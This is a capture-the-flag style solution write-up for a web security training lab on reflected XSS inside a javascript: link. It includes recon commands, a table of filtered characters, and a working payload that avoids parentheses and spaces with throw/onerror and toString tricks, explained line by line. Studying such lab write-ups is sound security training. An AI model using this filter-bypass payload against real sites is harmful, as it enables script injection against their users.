# Solution — Reflected XSS in a JavaScript URL with some characters blocked

## 1. Recon

```bash
curl -sS "https://<lab-id>.web-security-academy.net/" | grep -o '<title>[^<]*</title>'
# <title>Reflected XSS in a JavaScript URL with some characters blocked</title>

curl -sS -o /dev/null -w '%{http_code}\n' "https://<lab-id>.web-security-academy.net/exploit"
# 404  -> no exploit server on this lab
```

The blog index lists posts `/post?postId=1..5`. A post ends with:

```html
<div class="is-linkback">
  <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```

The `body:'…'` value is the **whole request query string**, encoded. Requesting
`/post?postId=1&ABC` renders `body:'/post%3fpostId%3d1%26ABC'` — our text lands
inside a single-quoted JavaScript string.

## 2. Character filter (measured)

Sending one character at a time as an extra parameter and reading the rendered
href shows two classes of treatment:

| input | served href | meaning |
|---|---|---|
| `'` | `%27` | escaped, but the browser decodes it back to `'` at execution |
| `< > & = : ; ?` | `%3c %3e %26 %3d %3a %3b %3f` | escaped (same, harmless) |
| `"` , `,` `*` `+` `-` `/` `!` `.` `~` `|` `$` `{}` | unchanged | allowed |
| `(` `)` `[` `]` `%` `` ` `` and space | **deleted** | must be avoided |
| `#` | starts a fragment | truncates the query |

So the payload cannot use parentheses or spaces — hence `/**/` and
`throw` + `onerror=alert` instead of `alert(…)`.

## 3. Payload

```
/post?postId=1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

What the browser executes after percent-decoding the `javascript:` URL:

```js
fetch('/analytics', {method:'post',body:'/post?postId=1&'},
      x=x=>{throw/**/onerror=alert,1337}, toString=x, window+'', {x:''})
  .finally(_ => window.location = '/')
```

* `'}` closes the string literal and the `fetch` options object.
* `,x=x=>{…}` becomes an extra (ignored) argument to `fetch`; being an arrow
  function, its body is a block, so a `throw` **statement** is legal there.
* `toString=x` and `window+''` force a string conversion of `window`, which
  invokes the arrow function, which throws.
* `onerror=alert` is assigned first inside the object literal expression, so the
  thrown value reaches `alert`, whose message contains `1337`.
* The trailing `{x:'` re-opens a string so the server's own `'}).finally(…)`
  remains syntactically valid.

## 4. Run

```bash
cd EXPERT/Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
```

The lab is checked server-side: the crafted request alone flips the header
widget to *Solved*. `alert` fires when **Back to Blog** is clicked.

Manual confirmation (no exploit server needed):

```bash
uv run python solve.py --url "https://<lab-id>.web-security-academy.net" --show-url
# open the printed URL, click "Back to Blog" -> alert containing 1337
```

## 5. Evidence

* `evidence/01-baseline-home.html` — `widgetcontainer-lab-status is-notsolved`
  captured before the first exploit request.
* `evidence/02-exploit-response.html` — response to the crafted URL.
* `evidence/03-home-after-exploit.html` — same page after, now
  `is-solved` + `<p>Solved</p>`.
* `evidence/browser-alert.txt` — Chromium: `alerts: ['Uncaught 1337']`.
* `responses/exploit-reflected-link.txt` — served href and its decoded form.

## 6. Result

Solved, exit code 0, 6 HTTP requests, 2.2 s (solver), 2.6 s through the root
launcher.
